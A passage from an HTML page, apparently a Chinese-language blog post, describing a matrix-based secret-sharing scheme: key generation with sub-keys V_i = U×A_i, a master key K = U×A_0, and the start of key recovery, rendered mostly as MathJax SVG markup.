74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mn" transform="translate(750, -150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(3251.8, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(3696.4, 0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(5035.1, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5479.8, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(750, -150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(6704, 0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container></li>
<li>信任单位产生<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="1.131ex" height="1.507ex" role="img" focusable="false" viewBox="0 -666 500 666"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>个任意<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="5.254ex" height="1.532ex" role="img" focusable="false" viewBox="0 -666 2322.4 677"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(722.2, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1722.4, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>维矩阵<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="1.735ex" height="1.595ex" role="img" focusable="false" viewBox="0 -683 767 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g></g></g></svg></mjx-container></li>
<li>产生n个次密钥<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="11.864ex" height="1.977ex" role="img" focusable="false" viewBox="0 -716 5243.9 873.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mi" transform="translate(583, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1154.7, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2210.5, 0)"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mo" transform="translate(3199.7, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msub" transform="translate(4200, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(750, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container><br>，不可暴露，分别保存</li>
<li>主密钥为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="12.139ex" height="1.994ex" role="img" focusable="false" viewBox="0 -716 5365.6 881.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g><g data-mml-node="mo" transform="translate(1166.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2222.6, 0)"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mo" transform="translate(3211.8, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msub" transform="translate(4212, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mn" transform="translate(750, -150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></g></svg></mjx-container></li>
<li>公开矩阵<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="16.299ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 7204 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(500, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mn" transform="translate(750, -150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1653.6, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2098.2, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mn" transform="translate(750, -150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(3251.8, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(3696.4, 0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(5035.1, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5479.8, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(750, -150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(6704, 0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container></li>
</ol>
<h2 id="密钥恢复"><a href="#密钥恢复" class="headerlink" title="密钥恢复"></a>密钥恢复</h2><ol>
<li>选取m组次密钥<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="15.61ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6899.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(500, 0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mn" transform="translate(583, -150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1486.6, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1931.2, 0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mn" transform="translate(583, -150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2917.8, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(3362.4, 0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(4701.1, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g 